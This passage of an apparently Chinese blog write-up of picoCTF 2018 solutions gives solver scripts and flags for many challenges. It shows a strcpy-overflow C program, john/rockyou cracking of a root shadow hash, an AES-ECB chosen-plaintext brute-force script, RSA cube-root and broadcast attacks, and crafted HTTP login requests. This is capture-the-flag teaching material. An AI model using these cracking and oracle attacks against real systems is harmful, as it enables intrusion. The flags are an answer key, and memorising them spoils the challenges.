class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">if</span> d1&gt;d2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s%s)"</span>%(s1[<span class="number">1</span>:<span class="number">-1</span>],s2)</span><br><span class="line">solve = <span class="keyword">lambda</span> x:reduce(calc,x.replace(<span class="string">" "</span>,<span class="string">''</span>).split(<span class="string">'+'</span>))</span><br><span class="line"></span><br><span class="line">host = <span class="string">'2018shell2.picoctf.com'</span></span><br><span class="line">port = <span class="number">61344</span></span><br><span class="line">r=remote(host,port)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">lines=r.recvuntil(<span class="string">'\n&gt;'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(lines)</span><br><span class="line">din=lines[<span class="number">-3</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]</span><br><span class="line">r.sendline(solve(din))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p><code>picoCTF{5cr1pt1nG_l1k3_4_pRo_cde4078d}</code> </p><h1 id="binary-exploitation"><a href="#binary-exploitation" class="headerlink" title="binary exploitation"></a>binary exploitation</h1><h2 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h2><p><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigsegv_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, flag);</span><br><span class="line">  fflush(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag,FLAGSIZE_MAX,f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Thanks! Received: %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This program takes 1 argument.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><h2 id="Crypto-Warmup-1"><a href="#Crypto-Warmup-1" class="headerlink" title="Crypto Warmup 1"></a>Crypto Warmup 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"picoCTF&#123;%s&#125;"</span>%<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr((ord(x[<span class="number">0</span>])-ord(x[<span class="number">1</span>]))%<span class="number">26</span>+ord(<span class="string">'a'</span>)),zip(<span class="string">'llkjmlmpadkkc'</span>,<span class="string">'thisisalilkey'</span>))).upper()</span><br><span class="line">picoCTF&#123;SECRETMESSAGE&#125;</span><br></pre></td></tr></table></figure><h2 id="caesar-cipher-2"><a href="#caesar-cipher-2" class="headerlink" title="caesar cipher 2"></a>caesar cipher 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr((ord(x)+<span class="number">32</span>)%<span class="number">0xff</span>),<span class="string">'PICO#4&amp;[C!ESA2?#I0H%R3?JU34?A2%N4?S%C5R%]'</span>))</span><br><span class="line"><span class="comment"># 'picoCTF&#123;cAesaR_CiPhErS_juST_aREnT_sEcUrE&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="hertz"><a href="#hertz" class="headerlink" title="hertz"></a>hertz</h2><p>替换密码。</p><p>在线工具：</p><ul><li><a href="https://www.guballa.de/substitution-solver" target="_blank" rel="noopener">https://www.guballa.de/substitution-solver</a> </li><li><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a> </li></ul><p><img src="1541076904847.png" alt="1541076904847"></p><h2 id="blaise’s-cipher"><a href="#blaise’s-cipher" class="headerlink" title="blaise’s cipher"></a>blaise’s cipher</h2><p>在线解密即可：<a href="https://www.dcode.fr/vigenere-cipher" target="_blank" rel="noopener">https://www.dcode.fr/vigenere-cipher</a> 。逐步得到KEY长度为4，KEY为<code>FLAG</code></p><p><code>picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_901e13a1}</code> </p><p>## </p><h2 id="Safe-RSA"><a href="#Safe-RSA" class="headerlink" title="Safe RSA"></a>Safe RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii</span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">c=<span class="number">2205316413931134031046440767620541984801091216351222789180593875373829950860542792110364325728088504479780803714561464250589795961097670884274813261496112882580892020487261058118157619586156815531561455215290361274334977137261636930849125</span></span><br><span class="line">m=gmpy2.iroot(c,e)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> binascii.unhexlify(hex(m).strip(<span class="string">'lL'</span>)[<span class="number">2</span>:])</span><br><span class="line"><span class="comment"># picoCTF&#123;e_w4y_t00_sm411_9f5d2464&#125;</span></span><br></pre></td></tr></table></figure><h2 id="【X】Super-Safe-RSA"><a href="#【X】Super-Safe-RSA" class="headerlink" title="【X】Super Safe RSA"></a>【X】Super Safe RSA</h2><p>参考<a href="https://findneo.github.io/180727rsa-attack/#广播攻击">RSA的广播攻击</a> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = findneo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2,re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> connect</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">c=[]</span><br><span class="line">n=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'buf'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        j=i.strip().split(<span class="string">' '</span>)</span><br><span class="line">        c.append(int(j[<span class="number">0</span>]))</span><br><span class="line">        n.append(int(j[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"mytag:"</span>,len(c)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'buf'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> len(c)&lt;<span class="number">65538</span>:</span><br><span class="line">        r=connect(<span class="string">'2018shell2.picoctf.com'</span>,<span class="number">24039</span>)</span><br><span class="line">        res=r.recv()</span><br><span class="line">        g=re.findall(<span class="string">'c: (\d+)\nn: (\d+)\n.*'</span>,res)[<span class="number">0</span>]</span><br><span class="line">        f.write(<span class="string">' '</span>.join(g)+<span class="string">'\n'</span>)</span><br><span class="line">        c.append(g[<span class="number">0</span>])</span><br><span class="line">        n.append(g[<span class="number">1</span>])</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="comment"># sleep(0.1)</span></span><br><span class="line">        <span class="keyword">if</span> len(c)%<span class="number">1000</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'mytag:'</span>,len(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> GCRT(n,c)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h2 id="HEEEEEEERE’S-Johnny"><a href="#HEEEEEEERE’S-Johnny" class="headerlink" title="HEEEEEEERE’S Johnny!"></a>HEEEEEEERE’S Johnny!</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/wordlists/rockyou.txt.gz .</span><br><span class="line">gunzip rockyou.txt.gz</span><br><span class="line">unshadow passwd shadow &gt; unshadowes.txt</span><br><span class="line">john --wordlist=~/mywordlists/rockyou.txt --rules unshadowes.txt</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"sha512crypt"</span>, but the string is also recognized as <span class="string">"crypt"</span></span><br><span class="line">Use the <span class="string">"--format=crypt"</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) <span class="variable">$6</span>$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">thematrix        (root)</span><br><span class="line">1g 0:00:00:16 DONE (2018-10-10 10:04) 0.06002g/s 660.7p/s 660.7c/s 660.7C/s kenya..saavedra</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br><span class="line">nc 2018shell2.picoctf.com 38860</span><br><span class="line">Username: root</span><br><span class="line">Password: thematrix</span><br><span class="line">picoCTF&#123;J0hn_1<span class="variable">$_R1pp3d_4e5aa29e</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="rsa-madlibs"><a href="#rsa-madlibs" class="headerlink" title="rsa-madlibs"></a>rsa-madlibs</h2><p>回答一些简单的RSA知识。可以参考<a href="https://findneo.github.io/180727rsa-attack/">CTF中常见的RSA相关问题总结</a> 一文。</p><p>发现一个做这类题目的好方法，<code>python solve.py | nc 2018shell2.picoctf.com 18148</code> ，不到必要就不去处理各种奇怪的数据。</p><p><code>picoCTF{d0_u_kn0w_th3_w@y_2_RS@_b38be18a}</code> </p><h2 id="SpyFi"><a href="#SpyFi" class="headerlink" title="SpyFi"></a>SpyFi</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2 -u</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">agent_code = <span class="string">"""flag"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(message) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        message = message + <span class="string">'0'</span>*(<span class="number">16</span> - len(message)%<span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key, plain)</span>:</span></span><br><span class="line">    cipher = AES.new( key.decode(<span class="string">'hex'</span>), AES.MODE_ECB )</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(plain).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">welcome = <span class="string">"Welcome, Agent 006!"</span></span><br><span class="line"><span class="keyword">print</span> welcome</span><br><span class="line"></span><br><span class="line">sitrep = raw_input(<span class="string">"Please enter your situation report: "</span>)</span><br><span class="line">message = <span class="string">"""Agent,</span></span><br><span class="line"><span class="string">Greetings. My situation report is as follows:</span></span><br><span class="line"><span class="string">&#123;0&#125;</span></span><br><span class="line"><span class="string">My agent identifying code is: &#123;1&#125;.</span></span><br><span class="line"><span class="string">Down with the Soviets,</span></span><br><span class="line"><span class="string">006</span></span><br><span class="line"><span class="string">"""</span>.format( sitrep, agent_code )</span><br><span class="line"></span><br><span class="line">message = pad(message)</span><br><span class="line"><span class="keyword">print</span> encrypt( <span class="string">"""key"""</span>, message )</span><br></pre></td></tr></table></figure><p>AES的ECB模式存在选择明文攻击。</p><p>当输入9个字节时，message中flag之外的部分长度为122个字节，密文长度为160个字节；当输入10个字节时，密文长度为176个字节。说明flag长度为160-122=38个字节。</p><p><img src="1538925911862.png" alt="1538925911862"></p><p>将message分组输出，看到爆破flag的机会。</p><p><img src="1538929635797.png" alt="1538929635797"></p><p>写完代码验证可行。</p><p><img src="1538934008777.png" alt="1538934008777"></p><p>最后成果：</p><p><code>picoCTF{@g3nt6_1$_th3_c00l3$t_8124762}</code> </p><p><img src="1538938179361.png" alt="1538938179361"></p><p><img src="1538938605546.png" alt="1538938605546"></p><p>全部代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">part_msg</span><span class="params">(message,part_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">sl=len(message)</span><br><span class="line">pl=part_length </span><br><span class="line">m=[message[pl*i:min(sl,pl*i+pl)] <span class="keyword">for</span> i <span class="keyword">in</span> range(sl/pl+(sl%pl&gt;<span class="number">0</span>))]</span><br><span class="line"><span class="keyword">return</span> m</span><br><span class="line">msg=[<span class="string">'Agent,\nGreetings. My situation report is as follows:\n'</span>,<span class="string">'\nMy agent identifying code is: '</span>,<span class="string">'.\nDown with the Soviets,\n006\n'</span>,]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> connect</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line">flag=<span class="string">'picoCTF&#123;@'</span></span><br><span class="line"><span class="comment"># sitrep,agent_code='',''</span></span><br><span class="line"><span class="comment"># message =msg[0] +sitrep+msg[1]+agent_code+msg[2]</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">38</span>-len(flag)):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line"><span class="comment"># print "flag:",i</span></span><br><span class="line">r=connect(<span class="string">"2018shell2.picoctf.com"</span>,<span class="number">37131</span>)</span><br><span class="line">cnt+=<span class="number">1</span>;time.sleep(<span class="number">1</span>)</span><br><span class="line">prompt=r.recvuntil(<span class="string">"report: "</span>)</span><br><span class="line"><span class="comment"># 113 + (11+16+38+10)  + 38 = 226</span></span><br><span class="line">base=<span class="string">'fying code is: '</span>+flag</span><br><span class="line">sitrep=<span class="string">'@'</span>*<span class="number">11</span>+base[<span class="number">-15</span>:]+i+<span class="string">'@'</span>*(<span class="number">38</span>-len(flag)+<span class="number">10</span>)</span><br><span class="line"><span class="comment"># agent_code="#"*38</span></span><br><span class="line"><span class="comment"># message =msg[0] +sitrep+msg[1]+agent_code+msg[2]</span></span><br><span class="line"><span class="comment"># print '\n'.join(map(repr,part_msg(message)))</span></span><br><span class="line">r.sendline(sitrep)</span><br><span class="line">response=r.recv()</span><br><span class="line"><span class="comment"># print len(response)</span></span><br><span class="line">tmp=part_msg(response,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># print len(tmp)</span></span><br><span class="line"><span class="comment"># print '\n'.join(tmp)</span></span><br><span class="line">r.close()</span><br><span class="line"><span class="comment"># print len(msg[0]+sitrep+msg[1]+flag)/16</span></span><br><span class="line"><span class="keyword">if</span> tmp[<span class="number">4</span>]==tmp[len(msg[<span class="number">0</span>]+sitrep+msg[<span class="number">1</span>]+flag)/<span class="number">16</span>]:</span><br><span class="line">flag+=i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span>,flag,cnt</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span>,time.asctime()</span><br><span class="line">solve()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span>,time.asctime()</span><br></pre></td></tr></table></figure><h1 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h1><h2 id="Buttons"><a href="#Buttons" class="headerlink" title="Buttons"></a>Buttons</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://2018shell2.picoctf.com:65107/button2.php --data <span class="string">"123"</span></span><br><span class="line">Well <span class="keyword">done</span>, your flag is: picoCTF&#123;button_button_whose_got_the_button_91f6f39a&#125;</span><br></pre></td></tr></table></figure><h2 id="Artisinal-Handcrafted-HTTP-3"><a href="#Artisinal-Handcrafted-HTTP-3" class="headerlink" title="Artisinal Handcrafted HTTP 3"></a>Artisinal Handcrafted HTTP 3</h2><p>先请求一下login页面：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br></pre></td></tr></table></figure><p>发现表单是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">x-powered-by: Express</span><br><span class="line">content-type: text/html; charset=utf<span class="number">-8</span></span><br><span class="line">content-length: <span class="number">498</span></span><br><span class="line">etag: W/<span class="string">"1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I"</span></span><br><span class="line">date: Sun, <span class="number">07</span> Oct <span class="number">2018</span> <span class="number">18</span>:<span class="number">33</span>:<span class="number">21</span> GMT</span><br><span class="line">connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"main.css"</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;header&gt;</span><br><span class="line">&lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">"/login"</span>&gt;Login&lt;/a&gt;</span><br><span class="line">&lt;/header&gt;</span><br><span class="line">&lt;main&gt;</span><br><span class="line">&lt;h2&gt;Log In&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">"POST"</span> action=<span class="string">"login"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"user"</span> placeholder=<span class="string">"Username"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"password"</span> name=<span class="string">"pass"</span> placeholder=<span class="string">"Password"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/main&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>再请求登陆：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">user=realbusinessuser&amp;pass=potoooooooo</span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">x-powered-by</span>: Express</span><br><span class="line"><span class="attribute">set-cookie</span>: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span><br><span class="line"><span class="attribute">location</span>: /</span><br><span class="line"><span class="attribute">vary</span>: Accept</span><br><span class="line"><span class="attribute">content-type</span>: text/plain; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span>: 23</span><br><span class="line"><span class="attribute">date</span>: Tue, 09 Oct 2018 15:11:46 GMT</span><br><span class="line"><span class="attribute">connection</span>: close</span><br><span class="line"></span><br><span class="line">Found. Redirecting to /</span><br></pre></td></tr></table></figure><p>带上cookie请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br><span class="line"><span class="attribute">cookie</span>: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> 